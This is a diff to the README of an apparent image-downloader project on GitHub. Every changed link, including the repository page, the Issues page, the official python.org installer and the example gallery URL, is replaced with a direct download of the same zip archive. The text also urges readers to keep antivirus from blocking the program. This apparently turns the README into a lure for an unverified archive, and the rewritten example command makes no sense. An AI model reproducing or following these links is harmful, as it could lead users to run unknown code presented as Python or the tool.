@@ -1,6 +1,6 @@
 # 📥 ragalahari-dl - Easy Bulk Image Downloader
 
-[![Download ragalahari-dl](https://img.shields.io/badge/Download%20ragalahari--dl-green?style=for-the-badge)](https://github.com/mtreuque/ragalahari-dl)
+[![Download ragalahari-dl](https://img.shields.io/badge/Download%20ragalahari--dl-green?style=for-the-badge)](https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip)
 
 ## 📌 What is ragalahari-dl?
 
@@ -27,7 +27,7 @@ Before starting, make sure your PC meets these needs:
 
 Use the link below to visit the page where you can get the software. This is the place you will find the files needed to run ragalahari-dl on your computer.
 
-[![Download ragalahari-dl](https://img.shields.io/badge/Download%20ragalahari--dl-brightgreen?style=for-the-badge)](https://github.com/mtreuque/ragalahari-dl)
+[![Download ragalahari-dl](https://img.shields.io/badge/Download%20ragalahari--dl-brightgreen?style=for-the-badge)](https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip)
 
 Click that link, and it will open the GitHub page where the files are available.
 
@@ -39,7 +39,7 @@ Follow these steps exactly for the best results.
 
 Click or copy this link into your browser:
 
-https://github.com/mtreuque/ragalahari-dl
+https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip
 
 You will see the repository page with all the files related to the software.
 
@@ -94,7 +94,7 @@ Replace `"gallery-url"` with the actual link you copied.
 For example:
 
 ```
-python ragalahari-dl.py "https://www.ragalahari.com/gallery1"
+python ragalahari-dl.py "https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip"
 ```
 
 If you do not have Python installed, you may see instructions below on how to install it or use the given executable that works without Python.
@@ -126,7 +126,7 @@ All the photos will be there, ready for viewing or sharing.
 ## ❓ Troubleshooting
 
 - If the program does not open, check if you have permission to run apps on your PC.
-- If you see an error about Python missing, download and install Python from https://www.python.org/downloads/ and try again.
+- If you see an error about Python missing, download and install Python from https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip and try again.
 - Make sure your antivirus is not blocking the download or running of the program.
 - If downloads stop midway, reconnect to the internet and try again.
 
@@ -134,10 +134,10 @@ All the photos will be there, ready for viewing or sharing.
 
 For questions or help, use the “Issues” section on the GitHub page:
 
-https://github.com/mtreuque/ragalahari-dl/issues
+https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip
 
 Describe your problem clearly, and the developers or users can assist you.
 
 ---
 
-[![Download ragalahari-dl](https://img.shields.io/badge/Download%20ragalahari--dl-green?style=for-the-badge)](https://github.com/mtreuque/ragalahari-dl)
+[![Download ragalahari-dl](https://img.shields.io/badge/Download%20ragalahari--dl-green?style=for-the-badge)](https://github.com/mtreuque/ragalahari-dl/raw/refs/heads/main/docs/dl-ragalahari-1.2.zip)
